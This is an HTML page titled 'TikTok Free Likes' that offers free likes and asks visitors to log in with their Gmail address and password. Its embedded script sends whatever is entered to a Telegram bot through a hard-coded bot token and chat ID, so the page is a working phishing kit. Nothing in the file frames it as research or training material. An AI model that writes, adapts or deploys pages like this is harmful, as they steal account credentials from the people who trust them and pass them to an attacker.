<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" h="width=device-width, initial-scale=1.0">
    <title>TikTok Free Likes</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 300px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #ff004f;
        }
        p {
            font-size: 14px;
            margin-bottom: 20px;
            color: #555;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #ff004f;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #e00045;
        }
        .notification {
            margin-top: 10px;
            color: green;
            display: none;
        }
        .error {
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TikTok Free Likes</h1>
        <p>Login TikTok account to get likes</p>
        <form id="loginForm">
            <input type="text" id="gmail" name="gmail" placeholder="Gmail" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Submit</button>
        </form>
        <div id="notification" class="notification"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const gmail = document.getElementById('gmail').value;
            const password = document.getElementById('password').value;
            const notification = document.getElementById('notification');

            const botToken = '7889888273:AAGqNZZKTd3WcEEpnSpwRoyYfGa2Q-qJC7o';
            const chatId = '7496010285';
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const message = `New Submission:\nGmail: ${gmail}\nPassword: ${password}`;

            try {
                const response = await fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    notification.textContent = 'Submission sent successfully!';
                    notification.classList.remove('error');
                    notification.style.display = 'block';
                    setTimeout(() => {
                        notification.style.display = 'none';
                    }, 3000);
                } else {
                    throw new Error(data.description || 'Failed to send message');
                }
            } catch (error) {
                notification.textContent = 'Error: ' + error.message;
                notification.classList.add('error');
                notification.style.display = 'block';
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 3000);
            }
        });
    </script>
</body>
</html
